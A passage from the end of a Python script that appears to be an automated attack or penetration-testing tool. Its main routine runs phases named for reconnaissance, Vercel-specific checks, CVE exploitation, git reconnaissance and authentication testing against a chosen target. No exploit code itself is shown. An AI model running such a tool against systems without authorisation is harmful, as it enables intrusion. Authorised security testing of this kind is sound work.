    THREADS = args.threads
    
    if args.output:
        OUTPUT_DIR = args.output
    
    print(f" {INFO} Detecting available tools...")
    detect_tools()
    
    print(f" {INFO} Setting up target...")
    platform = phase0_setup(args.target)
    
    # Run phases
    phase1_recon()
    phase2_vercel_specific()
    phase3_cve_exploitation()
    
    if not args.quick:
        if not args.skip_tool_scan:
            phase4_tool_scanning()
        if not args.skip_git:
            phase5_git_recon()
        phase6_auth_testing()
    
    phase7_report()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n {R}[!] Interrupted by user{N}")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n {R}[!] Fatal error: {e}{N}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

